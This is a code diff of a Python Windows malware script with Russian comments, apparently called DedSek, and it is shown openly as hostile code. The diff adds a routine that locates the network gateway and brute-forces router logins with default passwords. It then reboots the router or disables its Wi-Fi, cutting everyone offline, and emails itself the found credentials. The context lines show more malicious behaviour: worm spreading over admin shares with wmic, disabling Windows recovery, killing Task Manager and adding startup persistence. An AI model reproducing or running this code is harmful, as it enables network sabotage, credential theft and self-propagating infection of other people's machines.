@@ -70,13 +70,49 @@ def block_safe_mode():
         os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
     except: pass
 
+# ===== ОТКЛЮЧЕНИЕ ВСЕХ ОТ ИНТЕРНЕТА =====
+def disconnect_all_from_internet():
+    gateway = "192.168.1.1"
+    try:
+        route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        for line in route.split('\n'):
+            if '.' in line:
+                gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
+                if gw and not gw[0].startswith('0.'):
+                    gateway = gw[0]
+                    break
+    except: pass
+    
+    # Методы отключения
+    for url in [
+        f"http://{gateway}/reboot.cgi",
+        f"http://{gateway}/goform/Reboot",
+        f"http://{gateway}/userRpm/WlanNetworkRpm.htm?ssid=off",
+        f"http://{gateway}/goform/WifiBasicSet?wifiEnable=0",
+    ]:
+        try:
+            urllib.request.urlopen(url, timeout=3)
+            send_email(f"РОУТЕР {gateway} АТАКОВАН!\nВсе отключены от интернета!", "[DedSek] Router OFF")
+            return
+        except: pass
+    
+    # Подбор паролей
+    for user, pwd in [("admin","admin"),("admin","1234"),("admin",""),("root","admin"),("root","root")]:
+        try:
+            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+            req = urllib.request.Request(f"http://{gateway}/reboot.cgi")
+            req.add_header("Authorization", f"Basic {auth}")
+            urllib.request.urlopen(req, timeout=3)
+            send_email(f"РОУТЕР {gateway} ПЕРЕЗАГРУЖЕН!\nЛогин: {user}\nПароль: {pwd}", "[DedSek] Router REBOOT")
+            return
+        except: pass
+
+# ===== ЗАРАЖЕНИЕ СЕТИ =====
 def scan_network():
-    devices = []
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        devices = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
-    except: pass
-    return list(set(devices))
+        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
+    except: return []
 
 def infect_network():
     my_path = os.path.abspath(__file__)
@@ -85,14 +121,6 @@ def infect_network():
             os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
             shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
             os.system(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw" >nul 2>&1')
-        except: pass
-
-def router_reboot():
-    for ip, user, pwd in [("192.168.1.1","admin","admin"),("192.168.0.1","admin","1234"),("192.168.1.1","admin",""),("192.168.0.1","admin","")]:
-        try:
-            urllib.request.urlopen(f"http://{ip}/reboot.cgi", timeout=3)
-            send_email(f"ROUTER {ip} REBOOTED!", "[DedSek] Router")
-            return
         except: pass
 
 def add_to_startup():
@@ -300,7 +328,7 @@ if __name__ == "__main__":
     block_safe_mode()
     threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
     threading.Thread(target=infect_network, daemon=True).start()
-    threading.Thread(target=router_reboot, daemon=True).start()
+    threading.Thread(target=disconnect_all_from_internet, daemon=True).start()
     
     anim_fsociety()
     anim_stealer()
